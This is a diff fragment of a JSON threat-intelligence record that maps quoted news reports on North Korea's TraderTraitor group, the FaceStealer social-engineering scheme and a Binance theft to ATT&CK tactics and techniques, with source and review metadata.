+      "description": "“An FBI agent told Recorded Future News that it is unclear if FaceStealer was one of the methods used to breach Binance. “North Korea’s FaceStealer is a highly effective social engineering scheme capable of deceiving even the most experienced technical and security conscious…” — The Record",
+      "provenance": {
+        "article_source": "The Record",
+        "article_url": "https://therecord.media/stolen-binance-crypto-recovered-doj-facestealer-disrupted",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "The Record: Feds announce seizure of $1.2 billion from Binance theft; also takedown of ‘FaceStealer’ tools",
+          "url": "https://therecord.media/stolen-binance-crypto-recovered-doj-facestealer-disrupted"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1684",
+        "name": "Social Engineering",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1684"
+      }
+    },
+    {
+      "attack_ref": "INC-0358",
+      "confidence": "medium",
+      "description": "“With the target’s computer compromised, the hackers can steal cryptocurrency or exploit the target’s access to other computer infrastructure.” The “fix” typically installs a browser cookie harvester, keyloggers, screen capturers, and a backdoor onto the infected device.” — The Record",
+      "provenance": {
+        "article_source": "The Record",
+        "article_url": "https://therecord.media/stolen-binance-crypto-recovered-doj-facestealer-disrupted",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "The Record: Feds announce seizure of $1.2 billion from Binance theft; also takedown of ‘FaceStealer’ tools",
+          "url": "https://therecord.media/stolen-binance-crypto-recovered-doj-facestealer-disrupted"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "order": 8,
+          "shortname": "credential-access",
+          "url": "https://attack.mitre.org/tactics/TA0006"
+        },
+        {
+          "id": "TA0009",
+          "name": "Collection",
+          "order": 11,
+          "shortname": "collection",
+          "url": "https://attack.mitre.org/tactics/TA0009"
+        }
+      ],
+      "technique": {
+        "id": "T1056.001",
+        "name": "Input Capture: Keylogging",
+        "parent_id": "T1056",
+        "url": "https://attack.mitre.org/techniques/T1056/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0358",
+      "confidence": "medium",
+      "description": "“The FBI obtained a warrant to seize more than 900 webcam videos of FaceStealer victims.” — The Record",
+      "provenance": {
+        "article_source": "The Record",
+        "article_url": "https://therecord.media/stolen-binance-crypto-recovered-doj-facestealer-disrupted",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "The Record: Feds announce seizure of $1.2 billion from Binance theft; also takedown of ‘FaceStealer’ tools",
+          "url": "https://therecord.media/stolen-binance-crypto-recovered-doj-facestealer-disrupted"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0009",
+          "name": "Collection",
+          "order": 11,
+          "shortname": "collection",
+          "url": "https://attack.mitre.org/tactics/TA0009"
+        }
+      ],
+      "technique": {
+        "id": "T1125",
+        "name": "Video Capture",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1125"
+      }
+    },
+    {
+      "attack_ref": "INC-0358",
+      "confidence": "high",
+      "description": "“Michael Barnhart, a nation-state threat researcher at DTEX who has spent years tracking North Korean cybercrime campaigns, previously told Recorded Future News that TraderTraitor's modus operandi is to immediately offload stolen funds to Chinese money launderers for a lump sum…” — The Record",
+      "provenance": {
+        "article_source": "The Record",
+        "article_url": "https://therecord.media/stolen-binance-crypto-recovered-doj-facestealer-disrupted",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "The Record: Feds announce seizure of $1.2 billion from Binance theft; also takedown of ‘FaceStealer’ tools",
+          "url": "https://therecord.media/stolen-binance-crypto-recovered-doj-facestealer-disrupted"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0040",
+          "name": "Impact",
+          "order": 14,
+          "shortname": "impact",
+          "url": "https://attack.mitre.org/tactics/TA0040"
+        }
+      ],
+      "technique": {
+        "id": "T1657",
+        "name": "Financial Theft",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1657"
+      }
+    },
+    {
+      "attack_ref": "INC-0370",
+      "confidence": "medium",
+      "description": "“Typically in those situations, the U.S. government will file a claim of forfeiture with a judge, who will then determine who has a legitimate claim to the recovered funds. [ Read: North Korea Launches Missiles Toward the Sea to Protest Binance Hack Claims ] Also Thursday, the…” — SecurityWeek cybercrime",
+      "provenance": {
+        "article_source": "SecurityWeek cybercrime",
+        "article_url": "https://www.securityweek.com/fbi-says-us-seized-1-2-billion-worth-of-cryptocurrency-stolen-from-binance/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek cybercrime: FBI Says US Seized $1.2 Billion Worth of Cryptocurrency Stolen From Binance",
+          "url": "https://www.securityweek.com/fbi-says-us-seized-1-2-billion-worth-of-cryptocurrency-stolen-from-binance/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1684",
+        "name": "Social Engineering",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1684"
+      }
+    },
+    {
+      "attack_ref": "INC-0370",
+      "confidence": "medium",
+      "description": "“The U.S. government and private sector have so far combined to freeze more than $2.7 billion of the stolen funds, and the Justice Department said Thursday that it has now obtained court authorization to seize or restrain more than $1.2 billion of that total.” — SecurityWeek cybercrime",
+      "provenance": {
+        "article_source": "SecurityWeek cybercrime",
+        "article_url": "https://www.securityweek.com/fbi-says-us-seized-1-2-billion-worth-of-cryptocurrency-stolen-from-binance/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek cybercrime: FBI Says US Seized $1.2 Billion Worth of Cryptocurrency Stolen From Binance",
+          "url": "https://www.securityweek.com/fbi-says-us-seized-1-2-billion-worth-of-cryptocurrency-stolen-from-binance/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0040",
+          "name": "Impact",
+          "order": 14,
+          "shortname": "impact",
+          "url": "https://attack.mitre.org/tactics/TA0040"
+        }
+      ],
+      "technique": {
+        "id": "T1657",
+        "name": "Financial Theft",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1657"
+      }
+    }
+  ],
+  "schema_version": "1.0",
+  "slug": "tradertraitor",
+  "software": [],
+  "stix_modified": null,
+  "tactics_present": [
+    {
+      "id": "TA0043",
+      "name": "Reconnaissance",
+      "order": 0,
+      "shortname": "reconnaissance",
+      "url": "https://attack.mitre.org/tactics/TA0043"
+    },
+    {
+      "id": "TA0042",
+      "name": "Resource Development",
+      "order": 1,
+      "shortname": "resource-development",
+      "url": "https://attack.mitre.org/tactics/TA0042"
+    },
+    {
+      "id": "TA0001",
+      "name": "Initial Access",
+      "order": 2,
+      "shortname": "initial-access",
+      "url": "https://attack.mitre.org/tactics/TA0001"
+    },
+    {
+      "id": "TA0002",
+      "name": "Execution",
+      "order": 3,
+      "shortname": "execution",
+      "url": "https://attack.mitre.org/tactics/TA0002"
+    },
+    {
+      "id": "TA0003",
+      "name": "Persistence",
+      "order": 4,
+      "shortname": "persistence",
+      "url": "https://attack.mitre.org/tactics/TA0003"
+    },
+    {
+      "id": "TA0004",
+      "name": "Privilege Escalation",
+      "order": 5,
+      "shortname": "privilege-escalation",
+      "url": "https://attack.mitre.org/tactics/TA0004"
+    },
+    {
+      "id": "TA0005",
+      "name": "Stealth",
+      "order": 6,
+      "shortname": "stealth",
+      "url": "https://attack.mitre.org/tactics/TA0005"
+    },
+    {
+      "id": "TA0112",
+      "name": "Defense Impairment",
+      "order": 7,
+      "shortname": "defense-impairment",
+      "url": "https://attack.mitre.org/tactics/TA0112"
+    },
+    {
+      "id": "TA0006",
+      "name": "Credential Access",
+      "order": 8,
+      "shortname": "credential-access",
+      "url": "https://attack.mitre.org/tactics/TA0006"
+    },
+    {
+      "id": "TA0007",
+      "name": "Discovery",
+      "order": 9,
+      "shortname": "discovery",
+      "url": "https://attack.mitre.org/tactics/TA0007"
+    },
+    {
+      "id": "TA0008",
+      "name": "Lateral Movement",
+      "order": 10,
+      "shortname": "lateral-movement",
+      "url": "https://attack.mitre.org/tactics/TA0008"
+    },
+    {
+      "id": "TA0009",
+      "name": "Collection",
+      "order": 11,
+      "shortname": "collection",
+      "url": "https://attack.mitre.org/tactics/TA0009"
+    },
+    {
+      "id": "TA0011",
+      "name": "Command and Control",
+      "order": 12,
+      "shortname": "command-and-control",
+      "url": "https://attack.mitre.org/tactics/TA0011"
+    },
+    {
+      "id": "TA0010",
+      "name": "Exfiltration",
+      "order": 13,
+      "shortname": "exfiltration",
+      "url": "https://attack.mitre.org/tactics/TA0010"
+    },
+    {
+      "id": "TA0040",
+      "name": "Impact",
+      "order": 14,
+      "shortname": "impact",
+      "url": "https://attack.mitre.org/tactics/TA0040"
+    }
+  ]
+}
